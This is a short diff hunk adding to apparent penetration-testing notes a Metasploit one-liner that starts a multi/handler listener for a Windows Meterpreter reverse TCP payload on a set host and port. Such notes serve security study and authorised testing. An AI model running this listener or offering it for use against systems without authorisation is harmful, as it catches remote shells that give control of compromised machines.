@@ -548,6 +548,12 @@ Themida
 
 ###  multi/handler
 
+A one-liner:
+
+```bash
+msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.45.157;set LPORT 8090;run;"
+```
+
 Setting Up Multi/Handler
 
 ```shell-session
